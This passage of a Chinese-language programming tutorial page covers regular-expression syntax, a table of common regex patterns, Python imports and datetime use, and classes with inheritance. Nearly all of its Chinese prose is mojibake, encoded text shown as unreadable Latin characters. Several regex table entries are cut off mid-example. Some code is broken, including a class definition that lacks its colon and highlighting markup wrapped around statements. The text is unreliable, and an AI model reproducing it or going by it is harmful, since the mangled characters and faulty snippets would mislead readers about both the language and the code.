</tr>
<tr>
<td align="center">(?=pattern)</td>
<td>æ­£å‘è‚¯å®šé¢„æŸ¥ï¼Œåœ¨ä»»ä½•åŒ¹é…patternçš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦è·å–ä¾›ä»¥åä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œâ€œ`Windows(?=95</td>
</tr>
<tr>
<td align="center">(?!pattern)</td>
<td>æ­£å‘å¦å®šé¢„æŸ¥ï¼Œåœ¨ä»»ä½•ä¸åŒ¹é…patternçš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦è·å–ä¾›ä»¥åä½¿ç”¨ã€‚ä¾‹å¦‚â€œ`Windows(?!95</td>
</tr>
<tr>
<td align="center">(?&lt;=pattern)</td>
<td>åå‘è‚¯å®šé¢„æŸ¥ï¼Œä¸æ­£å‘è‚¯å®šé¢„æŸ¥ç±»æ‹Ÿï¼Œåªæ˜¯æ–¹å‘ç›¸åã€‚ä¾‹å¦‚ï¼Œâ€œ`(?&lt;=95</td>
</tr>
<tr>
<td align="center">(?&lt;!pattern)</td>
<td>åå‘å¦å®šé¢„æŸ¥ï¼Œä¸æ­£å‘å¦å®šé¢„æŸ¥ç±»æ‹Ÿï¼Œåªæ˜¯æ–¹å‘ç›¸åã€‚ä¾‹å¦‚â€œ`(?&lt;!95</td>
</tr>
<tr>
<td align="center">x|y</td>
<td>åŒ¹é…xæˆ–yã€‚ä¾‹å¦‚ï¼Œâ€œ`z</td>
</tr>
<tr>
<td align="center">[xyz]</td>
<td>å­—ç¬¦é›†åˆã€‚åŒ¹é…æ‰€åŒ…å«çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>[abc]</code>â€å¯ä»¥åŒ¹é…â€œ<code>plain</code>â€ä¸­çš„â€œ<code>a</code>â€ã€‚</td>
</tr>
<tr>
<td align="center">[^xyz]</td>
<td>è´Ÿå€¼å­—ç¬¦é›†åˆã€‚åŒ¹é…æœªåŒ…å«çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>[^abc]</code>â€å¯ä»¥åŒ¹é…â€œ<code>plain</code>â€ä¸­çš„â€œ<code>p</code>â€ã€‚</td>
</tr>
<tr>
<td align="center">[a-z]</td>
<td>å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>[a-z]</code>â€å¯ä»¥åŒ¹é…â€œ<code>a</code>â€åˆ°â€œ<code>z</code>â€èŒƒå›´å†…çš„ä»»æ„å°å†™å­—æ¯å­—ç¬¦ã€‚</td>
</tr>
<tr>
<td align="center">[^a-z]</td>
<td>è´Ÿå€¼å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…ä»»ä½•ä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>[^a-z]</code>â€å¯ä»¥åŒ¹é…ä»»ä½•ä¸åœ¨â€œ<code>a</code>â€åˆ°â€œ<code>z</code>â€èŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚</td>
</tr>
<tr>
<td align="center">\b</td>
<td>åŒ¹é…ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œä¹Ÿå°±æ˜¯æŒ‡å•è¯å’Œç©ºæ ¼é—´çš„ä½ç½®ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>er\b</code>â€å¯ä»¥åŒ¹é…â€œ<code>never</code>â€ä¸­çš„â€œ<code>er</code>â€ï¼Œä½†ä¸èƒ½åŒ¹é…â€œ<code>verb</code>â€ä¸­çš„â€œ<code>er</code>â€ã€‚</td>
</tr>
<tr>
<td align="center">\B</td>
<td>åŒ¹é…éå•è¯è¾¹ç•Œã€‚â€œ<code>er\B</code>â€èƒ½åŒ¹é…â€œ<code>verb</code>â€ä¸­çš„â€œ<code>er</code>â€ï¼Œä½†ä¸èƒ½åŒ¹é…â€œ<code>never</code>â€ä¸­çš„â€œ<code>er</code>â€ã€‚</td>
</tr>
<tr>
<td align="center">\cx</td>
<td>åŒ¹é…ç”±xæŒ‡æ˜çš„æ§åˆ¶å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ\cMåŒ¹é…ä¸€ä¸ªControl-Mæˆ–å›è½¦ç¬¦ã€‚xçš„å€¼å¿…é¡»ä¸ºA-Zæˆ–a-zä¹‹ä¸€ã€‚å¦åˆ™ï¼Œå°†cè§†ä¸ºä¸€ä¸ªåŸä¹‰çš„â€œ<code>c</code>â€å­—ç¬¦ã€‚</td>
</tr>
<tr>
<td align="center">\d</td>
<td>åŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº[0-9]ã€‚</td>
</tr>
<tr>
<td align="center">\D</td>
<td>åŒ¹é…ä¸€ä¸ªéæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº[^0-9]ã€‚</td>
</tr>
<tr>
<td align="center">\f</td>
<td>åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ã€‚ç­‰ä»·äº\x0cå’Œ\cLã€‚</td>
</tr>
<tr>
<td align="center">\n</td>
<td>åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ç­‰ä»·äº\x0aå’Œ\cJã€‚</td>
</tr>
<tr>
<td align="center">\r</td>
<td>åŒ¹é…ä¸€ä¸ªå›è½¦ç¬¦ã€‚ç­‰ä»·äº\x0då’Œ\cMã€‚</td>
</tr>
<tr>
<td align="center">\s</td>
<td>åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚ç­‰ä»·äº[ \f\n\r\t\v]ã€‚</td>
</tr>
<tr>
<td align="center">\S</td>
<td>åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ã€‚ç­‰ä»·äº[^ \f\n\r\t\v]ã€‚</td>
</tr>
<tr>
<td align="center">\t</td>
<td>åŒ¹é…ä¸€ä¸ªåˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº\x09å’Œ\cIã€‚</td>
</tr>
<tr>
<td align="center">\v</td>
<td>åŒ¹é…ä¸€ä¸ªå‚ç›´åˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº\x0bå’Œ\cKã€‚</td>
</tr>
<tr>
<td align="center">\w</td>
<td>åŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿çš„ä»»ä½•å•è¯å­—ç¬¦ã€‚ç­‰ä»·äºâ€œ<code>[A-Za-z0-9_]</code>â€ã€‚</td>
</tr>
<tr>
<td align="center">\W</td>
<td>åŒ¹é…ä»»ä½•éå•è¯å­—ç¬¦ã€‚ç­‰ä»·äºâ€œ<code>[^A-Za-z0-9_]</code>â€ã€‚</td>
</tr>
<tr>
<td align="center">\x<em>n</em></td>
<td>åŒ¹é…<em>n</em>ï¼Œå…¶ä¸­<em>n</em>ä¸ºåå…­è¿›åˆ¶è½¬ä¹‰å€¼ã€‚åå…­è¿›åˆ¶è½¬ä¹‰å€¼å¿…é¡»ä¸ºç¡®å®šçš„ä¸¤ä¸ªæ•°å­—é•¿ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>\x41</code>â€åŒ¹é…â€œ<code>A</code>â€ã€‚â€œ<code>\x041</code>â€åˆ™ç­‰ä»·äºâ€œ<code>\x04&amp;1</code>â€ã€‚æ­£åˆ™è¡¨è¾¾å¼ä¸­å¯ä»¥ä½¿ç”¨ASCIIç¼–ç ã€‚.</td>
</tr>
<tr>
<td align="center">*num*</td>
<td>åŒ¹é…<em>num</em>ï¼Œå…¶ä¸­<em>num</em>æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ã€‚å¯¹æ‰€è·å–çš„åŒ¹é…çš„å¼•ç”¨ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>(.)\1</code>â€åŒ¹é…ä¸¤ä¸ªè¿ç»­çš„ç›¸åŒå­—ç¬¦ã€‚</td>
</tr>
<tr>
<td align="center">*n*</td>
<td>æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€‚å¦‚æœ*n<em>ä¹‹å‰è‡³å°‘</em>n<em>ä¸ªè·å–çš„å­è¡¨è¾¾å¼ï¼Œåˆ™</em>n<em>ä¸ºå‘åå¼•ç”¨ã€‚å¦åˆ™ï¼Œå¦‚æœ</em>n<em>ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™</em>n*ä¸ºä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼ã€‚</td>
</tr>
<tr>
<td align="center">*nm*</td>
<td>æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€‚å¦‚æœ*nm<em>ä¹‹å‰è‡³å°‘æœ‰</em>nm<em>ä¸ªè·å¾—å­è¡¨è¾¾å¼ï¼Œåˆ™</em>nm<em>ä¸ºå‘åå¼•ç”¨ã€‚å¦‚æœ*nm</em>ä¹‹å‰è‡³å°‘æœ‰<em>n</em>ä¸ªè·å–ï¼Œåˆ™<em>n</em>ä¸ºä¸€ä¸ªåè·Ÿæ–‡å­—<em>m</em>çš„å‘åå¼•ç”¨ã€‚å¦‚æœå‰é¢çš„æ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œè‹¥<em>n</em>å’Œ<em>m</em>å‡ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™*nm<em>å°†åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼</em>nm*ã€‚</td>
</tr>
<tr>
<td align="center">*nml*</td>
<td>å¦‚æœ<em>n</em>ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-3ï¼‰ï¼Œä¸”<em>må’Œl</em>å‡ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼<em>nm</em>lã€‚</td>
</tr>
<tr>
<td align="center">\u<em>n</em></td>
<td>åŒ¹é…<em>n</em>ï¼Œå…¶ä¸­<em>n</em>æ˜¯ä¸€ä¸ªç”¨å››ä¸ªåå…­è¿›åˆ¶æ•°å­—è¡¨ç¤ºçš„Unicodeå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ\u00A9åŒ¹é…ç‰ˆæƒç¬¦å·ï¼ˆÂ©ï¼‰ã€‚</td>
</tr>
</tbody></table>
<h4 id="å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼"><a href="#å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼"></a>å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼</h4><table>
<thead>
<tr>
<th>ç”¨æˆ·å</th>
<th>/^[a-z0-9_-]{3,16}$/</th>
</tr>
</thead>
<tbody><tr>
<td>å¯†ç </td>
<td>/^[a-z0-9_-]{6,18}$/</td>
</tr>
<tr>
<td>åå…­è¿›åˆ¶å€¼</td>
<td>/^#?([a-f0-9]{6}|[a-f0-9]{3})$/</td>
</tr>
<tr>
<td>ç”µå­é‚®ç®±</td>
<td>/^([a-z0-9_.-]+)@([\da-z.-]+).([a-z.]{2,6})$/   /^[a-z\d]+(.[a-z\d]+)*@(<a href="-%5B%5Cda-z%5D">\da-z</a>?)+(.{1,2}[a-z]+)+$/</td>
</tr>
<tr>
<td>URL</td>
<td>/^(https?://)?([\da-z.-]+).([a-z.]{2,6})([/\w .-]*)*/?$/</td>
</tr>
<tr>
<td>IP åœ°å€</td>
<td>/((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)/ /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/</td>
</tr>
<tr>
<td>HTML æ ‡ç­¾</td>
<td>/^&lt;([a-z]+)([^&lt;]+)<em>(?:&gt;(.</em>)&lt;/\1&gt;|\s+/&gt;)$/</td>
</tr>
<tr>
<td>åˆ é™¤ä»£ç \æ³¨é‡Š</td>
<td>(?&lt;!http:|\S)//.*$</td>
</tr>
<tr>
<td>Unicodeç¼–ç ä¸­çš„æ±‰å­—èŒƒå›´</td>
<td>/^[\u2E80-\u9FFF]+$/</td>
</tr>
</tbody></table>
<hr>
<h2 id="pyæ¨¡å—ã€åŒ…"><a href="#pyæ¨¡å—ã€åŒ…" class="headerlink" title="pyæ¨¡å—ã€åŒ…"></a>pyæ¨¡å—ã€åŒ…</h2><h3 id="å¯¼å…¥æ¨¡å—"><a href="#å¯¼å…¥æ¨¡å—" class="headerlink" title="å¯¼å…¥æ¨¡å—"></a>å¯¼å…¥æ¨¡å—</h3><ul>
<li><p>å¯¼å…¥æ•´ä¸ªæ¨¡å—</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> moudle_name</span><br><span class="line"><span class="comment">#è°ƒç”¨</span></span><br><span class="line">moudle_name.function_name()</span><br></pre></td></tr></table></figure></li>
<li><p>å¯¼å…¥ç‰¹å®šçš„å‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> module_name <span class="keyword">import</span> function_name</span><br><span class="line"><span class="comment">#å¯ä»¥ç”¨é€—å·åˆ†éš”å‡½æ•°å</span></span><br><span class="line"><span class="keyword">from</span> module_name <span class="keyword">import</span> function_0,function_1</span><br></pre></td></tr></table></figure></li>
<li><p>ç”¨asç»™å‡½æ•°æŒ‡å®šåˆ«å</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> module_name <span class="keyword">import</span> function_name <span class="keyword">as</span> fn</span><br></pre></td></tr></table></figure></li>
<li><p>ç”¨asç»™æ¨¡å—æŒ‡å®šåˆ«å</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> module_name <span class="keyword">as</span> mn</span><br></pre></td></tr></table></figure></li>
<li><p>å¯¼å…¥æ¨¡å—ä¸­æ‰€æœ‰å‡½æ•°</p>
<p>ä½¿ç”¨<code>*</code>è¿ç®—å¯ä»¥å¯¼å…¥æ¨¡å—ä¸­çš„æ‰€æœ‰å‡½æ•°<code>from module_name import *</code></p>
</li>
<li><p>è¸©è¿‡å‘çš„ä¸€ç‚¹ï¼šä¾‹å¦‚æˆ‘æœ‰ä¸€ä¸ªæ–‡ä»¶æ­£åœ¨ç¼–è¾‘a.pyï¼Œæƒ³ä»bçš„åº“é‡Œé¢å¯¼å…¥åå­—ä¸ºaçš„æ¨¡å—ï¼Œé‚£ä¹ˆåœ¨a.pyçš„æ–‡ä»¶ä¸­ä¸å¯ä»¥æ‰§è¡Œ<code>from b import a</code>ï¼ŒåŸç†ä¹Ÿå¾ˆç®€å•ï¼Œä¼šå¼•å‘æ­§ä¹‰ï¼ŒæŠ¥é”™çš„å†…å®¹å¤§æ¦‚æ˜¯<code>&quot;b&quot; ImportError: cannot import name a</code></p>
<p>ï¼ˆPythonè¿è¡Œæ—¶ï¼Œå½“å‰ç›®å½•ä¸‹ä¸èƒ½æœ‰ä¸å¼•å…¥çš„åº“æ–‡ä»¶ç›¸åŒçš„pythonæ–‡ä»¶ï¼Œå¦åˆ™ä¼šåœ¨å¼•å…¥åº“æ–‡ä»¶æ—¶ï¼Œæ‰¾åˆ°ç›¸åŒçš„è¯¥æ–‡ä»¶ï¼‰</p>
</li>
</ul>
<h3 id="å¯¼å…¥åŒ…"><a href="#å¯¼å…¥åŒ…" class="headerlink" title="å¯¼å…¥åŒ…"></a>å¯¼å…¥åŒ…</h3><p>å‡è®¾å½“å‰ç¼–è¾‘ä½äº/desktop/test.pyçš„ç¨‹åºï¼Œéœ€è¦åœ¨/desktopä¸‹å»ºç«‹ä¸€ä¸ªæ–‡ä»¶å¤¹sourcesï¼Œ/desktop/sourcesä¸‹åŒ…å«ä½ æ‰€æœ‰éœ€è¦çš„æ¨¡å—ï¼Œå¹¶ä¸”å»ºç«‹ä¸€ä¸ªæ–°çš„æ–‡ä»¶init.py,è¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ªåŒ…çš„å»ºç«‹ ,    </p>
<p> usage:   <code>from sources import module_name1,module_name2...</code></p>
<h3 id="pyæ ‡å‡†åº“"><a href="#pyæ ‡å‡†åº“" class="headerlink" title="pyæ ‡å‡†åº“"></a>pyæ ‡å‡†åº“</h3><p><a href="http://docs.python.org/3/library">py3æ ‡å‡†åº“</a></p>
<p>[æ ‡å‡†åº“ä½¿ç”¨æŒ‡å—](<a href="https://docs.python.org/3.3/tutorial/stdlib">https://docs.python.org/3.3/tutorial/stdlib</a>. html)</p>
<p>datetime</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> datetime <span class="keyword">as</span> dt</span><br><span class="line"> <span class="comment"># å°†yyyy-mm-dd h:m:sæ ¼å¼çš„æ—¶é—´è½¬æ¢æˆpyçš„datetimeç±»å‹   </span></span><br><span class="line">date1 = dt.datetime.strptime(dep_date, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">date2 = dt.datetime.strptime(arr_date, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">(date1-date2).seconds</span><br><span class="line">(date1-date2).days</span><br><span class="line"></span><br><span class="line">date1.strftime(<span class="string">&quot;%d/%m/%Y&quot;</span>)</span><br><span class="line"><span class="comment">#é‡æ–°è½¬æˆå­—ç¬¦ä¸²è¾“å‡º</span></span><br></pre></td></tr></table></figure>





<hr>
<h2 id="ç±»ä¸å¯¹è±¡"><a href="#ç±»ä¸å¯¹è±¡" class="headerlink" title="ç±»ä¸å¯¹è±¡"></a>ç±»ä¸å¯¹è±¡</h2><ul>
<li>é¦–å…ˆä¾¿æ˜¯OOP(Object Oriented Programming)çš„æ¦‚å¿µäº†ï¼Œæ²¡å•¥å¥½è¯´çš„ã€‚ç®€å•æä¸€å¥ï¼Œå¦‚æœå¯¹è±¡å°±æ˜¯åè¯ï¼Œé‚£ä¹ˆæ–¹æ³•å°±æ˜¯åŠ¨è¯ã€‚ç±»ä»£è¡¨ç€ç‹¬ç«‹äº‹ç‰©çš„é«˜åº¦æŠ½è±¡ï¼Œè€Œå¯¹è±¡æ˜¯å¯¹ç±»çš„å®ä¾‹åŒ–å…·è±¡å®ç°å½¢å¼ã€‚ä¸€ç¬”å¸¦è¿‡ï¼Œä»¥å¾€çš„æ¦‚å¿µç›´æ¥å¥—ç”¨å³å¯    </li>
</ul>
<h4 id="ä»å»ºç«‹ä¸€ä¸ªç±»å¼€å§‹"><a href="#ä»å»ºç«‹ä¸€ä¸ªç±»å¼€å§‹" class="headerlink" title="ä»å»ºç«‹ä¸€ä¸ªç±»å¼€å§‹"></a>ä»å»ºç«‹ä¸€ä¸ªç±»å¼€å§‹</h4><p>çº¦å®šä¿—æˆçš„ä¸€ä¸ªè§„å®šï¼Œç±»åå¼€å¤´ç¬¬ä¸€ä¸ªå­—æ¯å¤§å†™ï¼Œç”¨äºåŒºåˆ†ï¼Œå¢åŠ å¯è¯»æ€§</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>()</span></span><br><span class="line"><span class="class">	<span class="title">pass</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">#å®ä¾‹åŒ–</span></span><br><span class="line"><span class="class"><span class="title">a_dog</span> = <span class="title">Dog</span>() </span></span><br></pre></td></tr></table></figure>



<ul>
<li>æ–¹æ³•<code>__init__()</code></li>
</ul>
<p>æ­¤æ–¹æ³•åœ¨æ¯æ¬¡è°ƒç”¨ç±»çš„å®ä¾‹æ—¶è‡ªåŠ¨è¿è¡Œ(ç›´æ¥â€œæœ›æ–‡ç”Ÿä¹‰â€å§ï¼Œinitialization)ï¼Œnameå’Œageç§°ä¹‹ä¸ºdogç±»çš„å±æ€§ï¼Œæ­¤æ–¹æ³•ç±»ä¼¼cç±»è¯­è¨€çš„æ„é€ å‡½æ•°ï¼Œselfç±»ä¼¼thisæŒ‡é’ˆ(æŒ‡å‘å½“å‰æ­£åœ¨åˆ›å»ºçš„å¯¹è±¡æœ¬èº«)ï¼Œselfåœ¨pyçš„<code>__init__()</code>ä¸­ä¸å¯ç¼ºçœ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>():</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sit</span> (<span class="params">self</span>):</span>     <span class="comment">#åä¸‹ï¼</span></span><br><span class="line">        <span class="built_in">print</span>(self.name.title()+<span class="string">&quot; is now sitting.&quot;</span>)</span><br><span class="line">       </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">roll_over</span>(<span class="params">self</span>):</span>    <span class="comment">#è®©ç‹—ç‹—æ‰“æ»šï¼ˆçˆªå·´ï¼Ÿï¼‰</span></span><br><span class="line">        <span class="built_in">print</span>(self.name.title()+<span class="string">&quot; rolled over!&quot;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>å®ä¾‹åŒ–</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dog = Dog(<span class="string">&#x27;harry&#x27;</span>  ,<span class="number">6</span>)</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨æ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dog.sit()</span><br><span class="line">my_dog.roll_over()</span><br></pre></td></tr></table></figure>

<p><strong>pyä¸­ç±»çš„å±æ€§æ²¡æœ‰ç”¨å±æ€§ä¿®é¥°å€¼privateå’ŒpublicåŒºåˆ†</strong>ï¼Œä½†æ˜¯ç§æœ‰(private)å¯¹è±¡/å‡½æ•°å¯ä»¥ç”¨<code>__name</code>çš„å½¢å¼å‘½åï¼Œå—ä¿æŠ¤(protected)çš„å¯¹è±¡/å‡½æ•°å¯ä»¥ç”¨<code>_name</code>çš„å½¢å¼å‘½åï¼Œåé¢è¿˜ä¼šæåŠ</p>
<h4 id="ä¿®æ”¹ç‰¹æ€§å€¼ï¼ˆ3ç§æ–¹å¼ï¼‰"><a href="#ä¿®æ”¹ç‰¹æ€§å€¼ï¼ˆ3ç§æ–¹å¼ï¼‰" class="headerlink" title="ä¿®æ”¹ç‰¹æ€§å€¼ï¼ˆ3ç§æ–¹å¼ï¼‰"></a>ä¿®æ”¹ç‰¹æ€§å€¼ï¼ˆ3ç§æ–¹å¼ï¼‰</h4><ol>
<li>ç›´æ¥ä¿®æ”¹å¯¹è±¡çš„å€¼<code>å¯¹è±¡å.ç‰¹æ€§å = å€¼</code>ï¼ˆ<code>object.attribute = value</code>ï¼‰</li>
<li>é€šè¿‡æ–¹æ³•ä¿®æ”¹ç‰¹æ€§(attribute)ï¼ˆç®€è€Œè¨€ä¹‹ï¼Œåœ¨ç±»ä¸­å»ºç«‹ä¸€ä¸ªå‡½æ•°ï¼ˆç§°ä¹‹ä¸ºæ–¹æ³•ï¼‰ï¼Œåœ¨æ–¹æ³•å†…ç”¨self.å±æ€§åæ¥æ”¹å˜ç‰¹æ€§å€¼ï¼‰</li>
<li>åœ¨æ–¹æ³•ä¸­é€’å¢ç‰¹æ€§å€¼</li>
</ol>
<h4 id="åœ¨å­ç±»ä¸­æ·»åŠ æ–°æ–¹æ³•"><a href="#åœ¨å­ç±»ä¸­æ·»åŠ æ–°æ–¹æ³•" class="headerlink" title="åœ¨å­ç±»ä¸­æ·»åŠ æ–°æ–¹æ³•"></a>åœ¨å­ç±»ä¸­æ·»åŠ æ–°æ–¹æ³•</h4><p>ä¸¾ä¸ªä¾‹å­å§ï¼Œä»¥æ±½è½¦ä¸­ç‰¹æ–¯æ‹‰å’Œå¥¥è¿ªä¸ºä¾‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_info</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;it a car&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Electric</span>(<span class="params">Car</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_electric_info</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;and it a electric car&quot;</span>)</span><br><span class="line"></span><br><span class="line">audi = Car()</span><br><span class="line">tesla = Electric()</span><br><span class="line"></span><br><span class="line">audi.print_info()</span><br><span class="line">tesla.print_info()</span><br><span class="line">tesla.print_electric_info()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">outs:</span></span><br><span class="line"><span class="string">it a car</span></span><br><span class="line"><span class="string">it a car                            </span></span><br><span class="line"><span class="string">and it a electric car</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="ç»§æ‰¿ï¼Œoverride"><a href="#ç»§æ‰¿ï¼Œoverride" class="headerlink" title="ç»§æ‰¿ï¼Œoverride"></a>ç»§æ‰¿ï¼Œoverride</h4><p>â€‹    1.å­ç±»ç»§æ‰¿çˆ¶ç±»åŸæœ‰æ–¹æ³•å®šä¹‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father_class</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, family_name, gender</span>):</span></span><br><span class="line">        self.family_name  = family_name</span><br><span class="line">        self.gender = gender</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_info</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(self.family_name+<span class="string">&#x27; &#x27;</span>+self.gender)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son_class</span>(<span class="params">Father_class</span>):</span>  <span class="comment">#ç»§æ‰¿å°±æ˜¯å°†çˆ¶ç±» ç±»å å†™å…¥å­ç±»æ‹¬å·ä¸­</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, family_name,gender,age</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(family_name,gender) <span class="comment">#super()ç”¨äºè·å–çˆ¶ç±»æ–¹æ³•çš„å®šä¹‰(å› ä¸ºå„¿å­å’Œçˆ¶äº²å§“æ°å’Œæ€§åˆ«ç›¸åŒ)</span></span><br><span class="line">        self.age = age</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_info</span>(<span class="params">self</span>):</span>         <span class="comment">#ç›¸åŒçš„å‡½æ•°åå‡ºç°åœ¨å­ç±»ä¸­ï¼Œå°±ä¼šé‡å†™(overrides)çˆ¶ç±»æ–¹æ³•</span></span><br><span class="line">       	<span class="built_in">print</span>(<span class="string">&quot;family name is:&quot;</span>+self.family_name +<span class="string">&quot;,son age is:&quot;</span>+self.age)</span><br><span class="line"></span><br><span class="line">father = Father_class(<span class="string">&#x27;smith&#x27;</span>,<span class="string">&#x27;male&#x27;</span>)</span><br><span class="line">son = Son_class(<span class="string">&#x27;smith&#x27;</span>,<span class="string">&#x27;male&#x27;</span>,<span class="string">&#x27;20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">son.print_info()</span><br><span class="line">father.print_info()</span><br><span class="line"><span class="comment">#outs: family name is:smith,son age is:20</span></span><br><span class="line"><span class="comment">#		smith male</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>super()æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å‡½æ•°ï¼Œå¸®åŠ©çˆ¶ç±»å’Œå­ç±»è”ç³»èµ·æ¥</li>
<li>é‡å†™çˆ¶ç±»æ–¹æ³•ï¼Œå½“å­ç±»å’Œçˆ¶ç±»çš„æ–¹æ³•åé‡å¤æ—¶ï¼Œå­ç±»æ–¹æ³•ä¼šè¦†ç›–çˆ¶ç±»æ–¹æ³•</li>
</ul>
<ol start="2">
<li>å¯ä»¥æŠŠç±»å½“ä½œå±æ€§å€¼èµ‹å€¼ç»™å¦ä¸€ä¸ªç±»ä¸­çš„å±æ€§ï¼Œç±»ä¼¼åµŒå¥—</li>
</ol>
